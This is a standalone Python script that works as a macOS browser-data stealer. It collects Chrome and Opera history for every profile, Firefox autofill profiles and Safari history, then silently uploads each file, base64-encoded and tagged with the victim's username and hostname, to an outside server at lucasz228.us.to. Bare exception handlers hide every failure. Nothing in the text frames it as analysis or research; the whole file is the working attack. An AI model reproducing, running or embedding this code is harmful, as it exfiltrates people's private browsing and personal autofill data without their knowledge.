import os
import base64
import json
import subprocess
from urllib.parse import urlencode
from urllib.request import Request, urlopen
import configparser
# attempt chrome mac
try:
    url = "http://lucasz228.us.to:50000/saveHistory"
    chromeHome = os.environ["HOME"]+"/Library/Application Support/Google/Chrome/"
    with open(chromeHome+"Local State", "r") as f:d = json.load(f)
    ps = list(d["profile"]["info_cache"].keys())
    for p in ps:
        with open(chromeHome+p+"/History", "rb") as f:
            r = Request(url, urlencode({"text": base64.b64encode(f.read()), "name": p, "username": os.environ["USER"], "ComputerName": (subprocess.check_output(['hostname']).decode().split("\n")[0].replace(".local",""))}).encode())
            with urlopen(r) as re:re.read()
except:pass
# attempt firefox mac
try:
    url = "http://lucasz228.us.to:50000/saveJson"
    firefoxHome = os.environ["HOME"]+"/Library/Application Support/Firefox/"
    ps = os.listdir(firefoxHome+"Profiles")
    for i in ps:
        try:
            with open(firefoxHome+"Profiles/"+i+"/autofill-profiles.json", "rb") as f:
                r = Request(url, urlencode({"data": base64.b64encode(f.read()), "username": os.environ["USER"], "ComputerName": (subprocess.check_output(['hostname']).decode().split("\n")[0].replace(".local",""))}).encode())
                with urlopen(r) as re:re.read()
        except:pass
except:pass
# attempt safari mac
try:
    url = "http://lucasz228.us.to:50000/saveSafariHistory"
    safariHome = os.environ["HOME"]+"/Library/Safari/"
    try:
        with open(safariHome+"History.db", "rb") as f:
            r = Request(url, urlencode({"text": base64.b64encode(f.read()), "username": os.environ["USER"], "ComputerName": (subprocess.check_output(['hostname']).decode().split("\n")[0].replace(".local",""))}).encode())
            with urlopen(r) as re:re.read()
    except:pass
except:pass

# attempt opera mac
try:
    url = "http://lucasz228.us.to:50000/saveHistory"
    chromeHome = os.environ["HOME"]+"/Library/Application Support/com.operasoftware.Opera/"
    with open(chromeHome+"Local State", "r") as f:d = json.load(f)
    ps = list(d["profile"]["info_cache"].keys())
    for p in ps:
        with open(chromeHome+p+"/History", "rb") as f:
            r = Request(url, urlencode({"text": base64.b64encode(f.read()), "name": p, "username": os.environ["USER"], "ComputerName": (subprocess.check_output(['hostname']).decode().split("\n")[0].replace(".local",""))}).encode())
            with urlopen(r) as re:re.read()
except:pass
